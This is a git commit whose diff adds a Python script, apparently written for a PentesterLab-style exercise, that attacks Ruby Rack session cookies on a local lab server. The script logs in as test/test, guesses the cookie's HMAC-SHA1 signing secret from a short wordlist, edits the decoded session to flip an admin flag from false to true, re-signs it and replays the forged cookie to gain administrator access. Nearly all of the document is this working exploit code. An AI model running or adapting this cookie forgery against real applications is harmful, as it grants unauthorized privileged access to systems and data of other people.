0ee6499aeda02e1092de01c0bd8a392ca4e676f5
vladislove <vlad74rus.rus@gmail.com>
2019-03-29 18:30:20 +0500

    Доделал скрипт декодирования rack cookie

--- DecodingRackCookie.py
+++ DecodingRackCookie.py
@@ -1,27 +1,58 @@
 import requests
 import base64
-from urllib.parse import unquote
-import marshal
-import pprint as pp
-import re
+import hmac
+from urllib.parse import unquote_to_bytes, quote
+from hashlib import sha1
 
-URL = "http://192.168.0.100/login"
-creds = "test"
+def get_new_cookie(cookie, signature):    
+    secret = get_secret(cookie, signature)
+    
+    cookie = base64.b64decode(cookie).decode('utf-8')
+    new_cookie = cookie.replace('adminF', 'adminT')
+    new_cookie = new_cookie.encode('utf-8')
+    new_cookie = base64.b64encode(new_cookie)    
+    
+    new_signature = get_new_signature(new_cookie, secret)
+    
+    return quote(new_cookie)+"--"+new_signature
 
-resp = requests.post(URL, "login=%(creds)s&password=%(creds)s" % {'creds': creds}, allow_redirects=False)
-c = resp.headers.get('Set-Cookie')
+#Возвращает secret, используемый для подписи cookie
+def get_secret(cookie, signature):
+    finding_secret = ''    
+    secret_variants = {
+        'secret',
+        'pentesterlab',
+        'admin',
+        'test',
+        'password'
+        }
+    
+    for secret_variant in secret_variants:
+        hm = hmac.new(secret_variant.encode(), cookie, sha1)
+        hm = hm.hexdigest()        
+        if hm == signature:
+            finding_secret = secret_variant         
+    
+    return finding_secret
 
-#Выберем значение cookie, для этого возьмем ее между символами = и ;
-c = c.split("=")[1].split("; ")[0]
-cookie, signature = c.split("--")
+def get_new_signature(cookie, secret):
+    return hmac.new(secret.encode(), cookie, sha1).hexdigest()
 
-decoded =  base64.b64decode(unquote(cookie))
 
-str_with_bytes = str(decoded)
-str_with_bytes = re.sub(r"\\x\d{,2}", "", str_with_bytes)
-str_with_bytes = str_with_bytes.replace("b'", "")
-str_with_bytes = str_with_bytes.replace(str_with_bytes[0], "")
-decoded = str_with_bytes.encode('utf-8')
 
-object = marshal.loads(decoded)
-pp.pprint(object)
+#Получили ответ с уязвимого сервера
+URL = "http://192.168.0.102/login"
+data = 'login=test&password=test'
+response = requests.post(URL, data=data, allow_redirects=False)
+
+#Получим cookie и signature из заголовка Set-Cookie
+cookie_content = response.headers.get('Set-Cookie')
+cookie_content = cookie_content.split("=")[1].split("; ")[0]
+cookie, signature = cookie_content.split("--")
+cookie = unquote_to_bytes(cookie)
+
+new_cookie = get_new_cookie(cookie, signature)
+print(new_cookie)
+cookies = {'rack.session': new_cookie}
+
+admin_response = requests.post(URL, data=data, cookies=cookies, allow_redirects=True)
